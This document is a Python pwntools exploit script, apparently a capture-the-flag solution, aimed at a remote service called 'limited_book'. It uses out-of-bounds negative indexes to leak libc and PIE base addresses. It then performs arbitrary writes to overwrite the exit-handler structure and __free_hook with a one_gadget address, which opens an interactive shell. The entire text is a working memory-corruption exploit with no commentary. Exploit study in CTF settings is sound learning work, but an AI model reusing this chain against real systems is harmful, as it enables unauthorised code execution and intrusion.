#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./limited_book")
p = remote("dpster.ml", 30010)
elf =ELF("./limited_book")
libc = elf.libc

def edit_data(index, data):
    p.sendlineafter("> ", '1')
    p.sendafter("idx: ", str(index))
    p.sendafter("data: ", data)

def print_data(index):
    p.sendlineafter("> ", '2')
    p.sendafter("idx: ", str(index))

#gdb.attach(p)

#libc leak
print_data(-0x60/8) 
p.recvuntil("data: ")
IO_wide_data = u64(p.recv(8)) 
libcBase = IO_wide_data - 0x3c49c0
one_gadget = libcBase + 0x4526a
puts = libcBase + libc.symbols['puts']
free_hook = libcBase + libc.symbols['__free_hook']
initial = libcBase + 0x3c5c40
log.info("libcBase : "+hex(libcBase))
log.info("IO_wide_data : "+hex(IO_wide_data))
log.info("free_hook : "+hex(free_hook))

# pie leak
print_data(-0x1f8/8)
p.recvuntil("data: ")
addr = u64(p.recv(8))
log.info("addr : "+hex(addr))
pie = addr - 0x202008
buf = pie + 0x202208
log.info("pie : "+hex(pie))
log.info("buf: "+hex(buf))

edit_data((initial-buf)/8+1 | 0x8000000000000000, p64(3))
edit_data((initial+8-buf)/8+1 | 0x8000000000000000, p64(0))
edit_data((free_hook-buf)/8+1 | 0x8000000000000000, p64(one_gadget))

p.interactive()
